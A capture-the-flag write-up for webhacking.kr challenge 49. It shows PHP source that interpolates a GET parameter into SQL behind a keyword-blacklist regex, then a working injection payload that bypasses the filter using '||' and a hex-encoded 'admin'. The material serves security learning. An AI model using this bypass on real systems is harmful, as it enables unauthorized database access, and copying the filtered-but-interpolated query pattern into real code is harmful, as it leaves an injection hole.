# Old 49    SQLi (OR Logical Operator Symbol)

URL: [https://webhacking.kr/challenge/web-24/?view_source=1](https://webhacking.kr/challenge/web-24/?view_source=1)

![old-49.png](/assets/ctf/webhacking.kr/old-49.png)

```php
<?php
include "../../config.php";
if ($_GET["view_source"]) { view_source(); }
?><html>
<head> <title>Challenge 49</title> </head>
<body>
<h1>SQL INJECTION</h1>
<form method=get>
level : <input name=lv value=1><input type=submit>
</form>
<?php if ($_GET["lv"]) {
    $db = dbconnect();
    if (
        preg_match(
            "/select|or|and|\(|\)|limit|,|\/|order|cash| |\t|\'|\"/i",
            $_GET["lv"]
        )
    ) {
        exit("no hack");
    }
    $result = mysqli_fetch_array(
        mysqli_query($db, "select id from chall49 where lv={$_GET["lv"]}")
    );
    echo $result[0];
    if ($result[0] == "admin") {
        solve(49);
    }
} ?>
<hr><a href=./?view_source=1>view-source</a>
</body>
</html>
```

We need `admin`, trying ids like `1`, `2`, `3`... results in random names. While bruteforce is a way that's too redundant and should be avoided.

What we want is to inject new query, but conditional keywords and spaces are restricted for us.

MySQL also supports symbols for logical operators, using `||` -> `OR` we can nullify first and inject query where `id` is `admin`:
```d
0||id=0x61646d696e
```

![old-49-1.png](/assets/ctf/webhacking.kr/old-49-1.png)

